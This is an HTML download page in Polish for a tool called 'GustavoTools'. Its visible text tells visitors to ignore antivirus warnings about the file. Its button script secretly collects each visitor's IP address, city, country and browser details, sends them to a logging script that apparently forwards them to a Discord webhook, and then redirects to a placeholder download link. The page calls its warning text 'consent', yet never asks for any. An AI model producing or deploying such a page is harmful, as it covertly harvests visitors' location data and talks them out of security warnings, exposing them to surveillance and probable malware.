<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <title>GustavoTools</title>
  <style>
    body {
      background-color: black;
      color: #ff073a;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    h1 {
      font-size: 48px;
      text-shadow: 0 0 10px #ff073a, 0 0 20px #ff073a;
    }
    button {
      padding: 20px 40px;
      font-size: 24px;
      color: white;
      background-color: #ff073a;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      box-shadow: 0 0 20px #ff073a;
    }
    button:hover {
      background-color: #cc0029;
    }
    #consent {
      margin-top: 30px;
      font-size: 14px;
      color: white;
    }
  </style>
</head>
<body>
  <h1>GustavoTools</h1>

  <div id="consent">
    <p>jezeli wyswietli sie komunikat z antywirusa, ziignoruj go. wyswietla sie bo wydawca jest nieznany.</p>
  </div>

  <button onclick="handleDownload()">Pobierz</button>

  <script>
    async function handleDownload() {
      const userAgent = navigator.userAgent;

      const location = await fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .catch(() => ({}));

      const payload = {
        userAgent: userAgent,
        ip: location.ip || "Nieznane",
        city: location.city || "Nieznane",
        country: location.country_name || "Nieznane"
      };

      // Wyślij dane do serwera PHP, który przekaże je do Discord webhooka
      await fetch("log.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });

      // Pobranie pliku po akceptacji
      window.location.href = "LINK_DO_POBRANIA";
    }
  </script>
</body>
</html>
